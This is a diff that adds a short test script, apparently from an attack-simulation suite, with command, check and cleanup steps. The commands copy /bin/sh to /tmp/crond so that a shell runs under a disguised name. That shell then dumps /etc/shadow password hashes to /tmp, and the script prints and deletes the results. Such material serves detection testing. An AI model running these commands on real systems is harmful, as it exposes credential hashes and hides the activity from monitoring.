@@ -1,0 +1,8 @@
+Elevation Required;
+#command
+cp /bin/sh /tmp/crond
+echo 'cat /etc/shadow > /tmp/shadow' | /tmp/crond
+#check
+cat /tmp/shadow | head -n 3
+#cleanup
+rm -f /tmp/crond /tmp/shadow
